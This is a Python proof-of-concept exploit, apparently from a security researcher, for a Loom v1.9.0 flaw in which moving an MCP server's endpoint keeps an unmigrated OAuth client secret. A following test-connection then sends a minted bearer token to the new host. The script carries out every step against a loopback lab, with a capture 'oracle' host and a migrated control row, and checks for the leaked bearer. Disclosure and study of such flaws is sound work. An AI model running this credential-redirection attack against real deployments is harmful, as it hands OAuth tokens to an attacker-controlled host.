#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: loom-oauth-flag-follow (Medium: 6.6)
#  Vendor: Loom (AWS)
#  Versions: Loom v1.9.0 and v1.10.3
#  Impact: unmigrated OAuth client secret follows a URL move and a test sends the bearer
#  Requires: Docker, loopback only, public tag checkout
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "loom-oauth-flag-follow"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""Loom v1.9.0: OAuth client secret follows an endpoint move when the flag is not "true".

Same-group mcp:write PUTs a new endpoint_url and omits oauth2_client_secret.
The clear runs only when has_oauth2_secret == "true". An unmigrated row still
resolves the legacy column, mints, and sends Authorization: Bearer to the new
host. An API-created row (flag "true") is the control: the product clears it.
"""

import json
import os
import urllib.error
import urllib.request
from typing import Any

LABEL = "LOOM-190-OAUTH-FLAG-FOLLOW"
WITNESS = "LOOM-190-OAUTH-FLAG-FOLLOW-WITNESS"
LOOM_URL = os.environ.get("LOOM_URL", "http://127.0.0.1:18790").rstrip("/")
ORACLE_URL = os.environ.get("ORACLE_URL", "http://127.0.0.1:18791").rstrip("/")
TOKEN = "lab-demo"
SUB = "lab-demo"
UNMIGRATED_NAME = "lab-oauth"
CONTROL_NAME = "lab-oauth-ctrl"
UNMIGRATED_ENDPOINT = "http://oracle/mcp"
CONTROL_ENDPOINT = "http://oracle/mcp-ctrl"
PRE_SECRET = "lab-pre-oauth-secret"
CTRL_SECRET = "lab-ctrl-oauth-secret"
WELL_KNOWN = "https://idp.lab.invalid/.well-known/openid-configuration"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason}")
    return 1


def success() -> int:
    log(f"SUCCESS {LABEL} unmigrated-follow=yes migrated-cleared=yes {WITNESS}")
    return 0


def http(
    method: str,
    path: str,
    payload: dict[str, Any] | None = None,
    timeout: int = 30,
    base: str | None = None,
    token: str | None = TOKEN,
) -> tuple[int, str]:
    root = (base or LOOM_URL).rstrip("/")
    url = path if path.startswith("http") else f"{root}{path}"
    data = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")
    except Exception as exc:
        return 0, str(exc)


def parse_json(body: str) -> Any:
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return None


def row_state(server_id: int) -> tuple[str | None, str | None]:
    """Raw has_oauth2_secret column and legacy oauth2_client_secret column."""
    from app.db import SessionLocal
    from app.models.mcp import McpServer

    db = SessionLocal()
    try:
        row = db.query(McpServer).filter(McpServer.id == server_id).one()
        db.refresh(row)
        flag = row.has_oauth2_secret
        secret = row.oauth2_client_secret
        return (None if flag is None else str(flag), None if secret is None else str(secret))
    finally:
        db.close()


def captures() -> list[dict[str, Any]]:
    code, body = http("GET", "/captures", base=ORACLE_URL, token=None)
    log(f"ioc captures-http={code} body={body[:1200]}")
    parsed = parse_json(body)
    rows = parsed.get("captures") if isinstance(parsed, dict) else None
    if code != 200 or not isinstance(rows, list):
        return []
    return [row for row in rows if isinstance(row, dict)]


def auths_for(rows: list[dict[str, Any]], path: str) -> list[str]:
    return [str(row.get("authorization") or "") for row in rows if row.get("path") == path]


def has_bearer(auth: str) -> bool:
    return auth.startswith("Bearer ") and len(auth) > len("Bearer ")


def find_server(name: str) -> int | None:
    code, body = http("GET", "/api/mcp/servers")
    log(f"ioc list-http={code}")
    rows = parse_json(body)
    if code != 200 or not isinstance(rows, list):
        return None
    for row in rows:
        if isinstance(row, dict) and row.get("name") == name and row.get("id") is not None:
            return int(row["id"])
    return None


def main() -> int:
    unauth, unauth_body = http("GET", "/api/auth/me", token=None)
    log(f"ioc unauth-me-http={unauth}")
    if unauth != 401:
        return fail(f"unauth-me={unauth} body={unauth_body[:200]}")

    me_http, me_body = http("GET", "/api/auth/me")
    log(f"ioc me-http={me_http} body={me_body[:300]}")
    me = parse_json(me_body)
    groups = me.get("groups") if isinstance(me, dict) else None
    if me_http != 200 or not isinstance(me, dict) or me.get("sub") != SUB:
        return fail(f"me-http={me_http}")
    if not isinstance(groups, list) or "g-admins-demo" not in groups or "t-admin" not in groups:
        return fail(f"me-groups={groups}")

    server_id = find_server(UNMIGRATED_NAME)
    if server_id is None:
        return fail("unmigrated-seed-missing")
    flag, secret = row_state(server_id)
    log(f"ioc unmigrated-seed-flag={flag!r} column-set={secret is not None}")
    if flag == "true" or secret != PRE_SECRET:
        return fail("unmigrated-seed-not-legacy")

    put_http, put_body = http(
        "PUT",
        f"/api/mcp/servers/{server_id}",
        {"endpoint_url": UNMIGRATED_ENDPOINT},
    )
    log(f"ioc unmigrated-put-http={put_http} body={put_body[:400]}")
    moved = parse_json(put_body)
    flag, secret = row_state(server_id)
    log(f"ioc unmigrated-move={put_http} flag-after={flag!r}")
    if put_http != 200 or not isinstance(moved, dict):
        return fail(f"unmigrated-move={put_http}")
    if moved.get("endpoint_url") != UNMIGRATED_ENDPOINT:
        return fail(f"unmigrated-endpoint={moved.get('endpoint_url')}")
    unmigrated_kept = flag != "true" and secret == PRE_SECRET

    test_http, test_body = http(
        "POST",
        f"/api/mcp/servers/{server_id}/test-connection",
        timeout=60,
    )
    log(f"ioc unmigrated-test-http={test_http} body={test_body[:300]}")
    rows = captures()
    unmigrated_auths = auths_for(rows, "/mcp")
    unmigrated_follow = any(WITNESS in auth and has_bearer(auth) for auth in unmigrated_auths)
    log(f"ioc unmigrated-oracle-witness={'yes' if unmigrated_follow else 'no'}")

    create_http, create_body = http(
        "POST",
        "/api/mcp/servers",
        {
            "name": CONTROL_NAME,
            "description": "migrated-oauth",
            "endpoint_url": "http://10.255.255.1/old-ctrl",
            "transport_type": "streamable_http",
            "auth_type": "oauth2",
            "oauth2_well_known_url": WELL_KNOWN,
            "oauth2_client_id": "lab-client-ctrl",
            "oauth2_client_secret": CTRL_SECRET,
            "delegation_mode": "m2m",
            "tags": {"loom:group": "demo"},
        },
    )
    log(f"ioc control-create-http={create_http} body={create_body[:400]}")
    created = parse_json(create_body)
    if create_http != 201 or not isinstance(created, dict) or created.get("id") is None:
        return fail(f"control-create={create_http}")
    control_id = int(created["id"])
    cflag, csecret = row_state(control_id)
    log(f"ioc control-seed-flag={cflag!r} column-set={csecret is not None}")
    if cflag != "true" or csecret is not None:
        return fail("control-not-migrated-shape")

    cput_http, cput_body = http(
        "PUT",
        f"/api/mcp/servers/{control_id}",
        {"endpoint_url": CONTROL_ENDPOINT},
    )
    log(f"ioc control-put-http={cput_http} body={cput_body[:400]}")
    cmoved = parse_json(cput_body)
    cflag, csecret = row_state(control_id)
    cleared = cflag == "false" and csecret is None
    log(f"ioc migrated-move-cleared={'yes' if cleared else 'no'} flag-after={cflag!r}")
    if cput_http != 200 or not isinstance(cmoved, dict):
        return fail(f"control-move={cput_http}")
    if cmoved.get("endpoint_url") != CONTROL_ENDPOINT:
        return fail(f"control-endpoint={cmoved.get('endpoint_url')}")

    ctest_http, ctest_body = http(
        "POST",
        f"/api/mcp/servers/{control_id}/test-connection",
        timeout=60,
    )
    log(f"ioc control-test-http={ctest_http} body={ctest_body[:300]}")
    rows = captures()
    control_auths = auths_for(rows, "/mcp-ctrl")
    # A bearer here was minted from the control secret. The product clear sends none.
    control_sent = any(has_bearer(auth) for auth in control_auths)
    log(f"ioc migrated-oracle-witness={'yes' if control_sent else 'no'}")
    if not control_auths:
        return fail("control-oracle-no-capture")

    if unmigrated_follow and cleared and not control_sent and unmigrated_kept:
        return success()
    if not unmigrated_follow and not control_sent:
        return fail("leftover-closed")
    if not unmigrated_follow:
        return fail("unmigrated-no-witness")
    if not cleared or not unmigrated_kept:
        return fail("migrated-not-cleared" if not cleared else "unmigrated-column-cleared")
    return fail("migrated-oracle-witness")


if __name__ == "__main__":
    raise SystemExit(main())

